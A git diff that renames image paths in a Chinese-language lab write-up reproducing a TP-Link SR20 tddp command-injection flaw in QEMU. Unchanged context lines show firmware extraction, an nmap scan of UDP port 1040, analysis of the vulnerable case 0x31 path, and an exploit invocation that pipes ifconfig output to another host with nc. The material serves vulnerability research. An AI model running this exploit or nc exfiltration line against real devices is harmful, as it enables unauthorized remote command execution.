@@ -56,7 +56,7 @@ sudo ./deps.sh $ Debian/Ubuntu
 
 下载最新版 Published Date: 2019-12-17
 
-![fig1Squashfs](/TPlinkSR20 rce/fig1Squashfs.png)
+![fig1Squashfs](/TPlinkSR20_rce/fig1Squashfs.png)
 
 ```python
 binwalk -Me tpra_sr20v1_us-up-ver1-2-4-P123\[20191212-rel55239\]_2019-12-12_16.21.36.bin
@@ -107,7 +107,7 @@ mount -t proc /proc/ ./H4lo-TP-Link_SR20/proc/
 chroot H*-TP-Link_SR20 sh
 ```
 
-![fig2arm](/TPlinkSR20 rce/fig2arm.jpg)
+![fig2arm](/TPlinkSR20_rce/fig2arm.jpg)
 
 
 
@@ -120,7 +120,7 @@ sudo systemctl start atftpd
 sudo systemctl status atftpd
 ```
 
-![fig3atftpd](/TPlinkSR20 rce/fig3atftpd.jpg)
+![fig3atftpd](/TPlinkSR20_rce/fig3atftpd.jpg)
 
 
 
@@ -164,7 +164,7 @@ qemu-arm -L ./ ./usr/bin/tddp
 
 但是此时是在qemu中的，所以直接./即可执行
 
-![fig9-tddp](/TPlinkSR20 rce/fig9-tddp.jpg)
+![fig9-tddp](/TPlinkSR20_rce/fig9-tddp.jpg)
 
 
 
@@ -172,7 +172,7 @@ qemu-arm -L ./ ./usr/bin/tddp
 
 结果如下：
 
-![fig10-res](/TPlinkSR20 rce/fig10-res.png)
+![fig10-res](/TPlinkSR20_rce/fig10-res.png)
 
 有错误，是在调用Lua API的时候出错了，我太菜了不懂原理，先不用这种了，用另一种方法。
 
@@ -228,7 +228,7 @@ sudo systemctl status atftpd
 nmap -p 1040 -sU 10.10.10.2
 ```
 
-![fig11-nmap](/TPlinkSR20 rce/fig11-nmap.jpg)
+![fig11-nmap](/TPlinkSR20_rce/fig11-nmap.jpg)
 
 
 
@@ -248,13 +248,13 @@ TypeError: ljust() argument 2 must be char, not str
 
 这是因为别的大佬在发布文章的时候，反斜杠 \ 这个字符被网页过滤了，再加上就好。payload如下：
 
-![fig12-payload](/TPlinkSR20 rce/fig12-payload.jpg)
+![fig12-payload](/TPlinkSR20_rce/fig12-payload.jpg)
 
 
 
 命令成功执行结果如下：
 
-![fig13-res_date](/TPlinkSR20 rce/fig13-res_date.jpg)
+![fig13-res_date](/TPlinkSR20_rce/fig13-res_date.jpg)
 
 
 
@@ -266,7 +266,7 @@ qemu打开tddp：`./usr/bin/tddp`
 
 宿主机执行exp：`python exp.py 10.10.10.2 "ifconfig|nc 10.10.10.1 7890"`
 
-结果如下![fig14-res-nc](/TPlinkSR20 rce/fig14-res-nc.jpg)
+结果如下![fig14-res-nc](/TPlinkSR20_rce/fig14-res-nc.jpg)
 
 右下角输出的是命令ifconfig的内容。
 
@@ -311,25 +311,25 @@ v14 = recvfrom(a1[9], (char *)a1 + 45083, 0xAFC8u, 0, &addr, &addr_len);
 
 下面还有判断协议版本的
 
-![fig4](/TPlinkSR20 rce/fig4.jpg)
+![fig4](/TPlinkSR20_rce/fig4.jpg)
 
 
 
 sub_936c调用了sub_16418，查看sub_936c内容如下，根据其输出内容以及setsockopt函数，判断其为主函数。
 
-![fig5](/TPlinkSR20 rce/fig5.jpg)
+![fig5](/TPlinkSR20_rce/fig5.jpg)
 
 
 
 刚才的sub_16418函数的recvfrom下面调用了sub_15E74函数。它会对传入的多个值进行比较，根据前置知识，知道了漏洞出现在case 0x31的位置。
 
-![fig6-0x31](/TPlinkSR20 rce/fig6-0x31.jpg)
+![fig6-0x31](/TPlinkSR20_rce/fig6-0x31.jpg)
 
 
 
 跟随其进入sub_A580处。
 
-![fig7-scanf](/TPlinkSR20 rce/fig7-scanf.jpg)
+![fig7-scanf](/TPlinkSR20_rce/fig7-scanf.jpg)
 
 
 
@@ -337,7 +337,7 @@ sub_936c调用了sub_16418，查看sub_936c内容如下，根据其输出内容�
 
 随后调用sub_91DC函数。这里的cd /tmp很可疑，可能会存在指令注入。
 
-![fig8-cmd](/TPlinkSR20 rce/fig8-cmd.jpg)
+![fig8-cmd](/TPlinkSR20_rce/fig8-cmd.jpg)
 
 漏洞就是在这个tftp位置处。`如果我们在我们的攻击机上配置一个atftp服务，并且向TP-Link SR20的1040端口传输一个第二个字节数据为0x31的tddp数据包，那这个路由器就会从我们的攻击机上下载文件。`
 
